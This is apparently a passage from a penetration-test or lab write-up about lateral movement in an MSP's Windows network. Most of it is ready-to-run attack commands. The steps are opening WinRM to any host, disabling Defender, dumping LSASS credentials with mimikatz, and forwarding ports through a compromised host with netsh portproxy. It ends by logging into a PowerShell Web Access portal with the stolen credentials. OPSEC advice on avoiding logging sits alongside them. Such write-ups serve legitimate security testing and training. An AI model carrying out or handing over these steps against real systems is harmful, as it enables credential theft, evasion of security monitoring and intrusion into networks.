```powershell
# FROM MSP-SQLREPORT
winrm set winrm/config/client '@{TrustedHosts="*"}'
winrs -r:10.200.8.22 -u:msp\mspdb -p:"REDACTED_SECRET" cmd
```

Access is available via both WinRM and PSWA. Using PSWA as a lateral movement vector is poor OPSEC — it should be avoided unless visibility is not a concern.

> PSWA introduces multiple logging sources (IIS, web authentication, PowerShell, and Windows Event Logs), making it a highly visible lateral movement vector. PowerShell Remoting over WinRM generates less telemetry and blends more naturally with normal administrative traffic.

## ATTACK CHAIN

No direct lateral movement chain from this host. However, a credential exposure vector exists due to CredSSP — this mechanism delegates full credentials to the PSWA server, where they may be stored in LSASS memory.

## EXPLOITATION

#### 1. Temporarily Disable Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### 2. LSASS Credential Dump

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"
# Username : MSP-SRV01$
# NTLM     : REDACTED_HASH
# Username : Administrator
# NTLM     : REDACTED_HASH
```

> No Credential Guard or LSA Protection on this host — LSASS is directly accessible.

#### 3. Restore Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

## POST-EXPLOITATION

`IT-EMPLOYEE15` cannot directly reach `MSP-SRV01` due to network segmentation. However, `MSP-SQLREPORT` has connectivity to that segment and can be used as a pivot for port forwarding to access the PSWA portal.

#### 1. Configure Port Forwarding on MSP-SQLREPORT

```powershell
netsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=443 connectaddress=10.200.8.22
```

All incoming connections on port 443 of `msp-sqlreport` are redirected to `10.200.8.22:443` (MSP-SRV01). This allows accessing the PSWA portal through the compromised pivot host.

#### 2. Access PSWA Portal

```http
https://10.200.8.10/pswa/en-US/logon.aspx?ReturnUrl=%2fPSWA%2f
https://msp-sqlreport.msp.example/pswa/en-US/logon.aspx?ReturnUrl=%2fPSWA%2f
```

Authentication uses the previously compromised credentials: `msp\REDACTED_SECRET`

> Evidencia: formulario de Windows PowerShell Web Access. El usuario y la dirección originales de la captura se omiten; la contraseña aparecía oculta.
